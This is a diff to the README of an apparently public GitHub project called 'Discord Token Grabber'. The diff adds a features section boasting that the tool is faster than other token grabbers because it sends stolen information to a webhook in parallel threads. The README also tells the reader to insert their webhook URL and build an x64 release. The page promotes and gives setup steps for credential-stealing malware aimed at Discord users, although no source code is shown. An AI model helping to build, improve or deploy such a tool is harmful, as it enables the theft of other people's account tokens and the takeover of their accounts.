@@ -7,10 +7,14 @@
 + The system must have a 64-bit processor architecture (x64) and be capable of running a 64-bit operating system and applications.
 
 
+# 🔥 Features
++ **🪄 5x faster than other similar token grabbers**: This project divides each task into different threads, which makes the information collected and sent to the webhook simultaneously to save time.
+
+
 # 📖 Instructions
 1. Open the solution and add your webhool URL to the [Main.cpp](https://github.com/NotFxeel/Discord-Token-Grabber/blob/main/Discord%20Token%20Grabber/Main.cpp) file.
 
-![image](https://github.com/NotFxeel/Discord-Token-Grabber/assets/161180618/d66b9105-13ed-4e5a-baa8-af636b4172a1)
+![image](https://github.com/NotFxeel/Discord-Token-Grabber/assets/161180618/c52f17ca-7c4c-4209-8403-1603ac6e41f3)
 
 2. Build a x64 release.
 
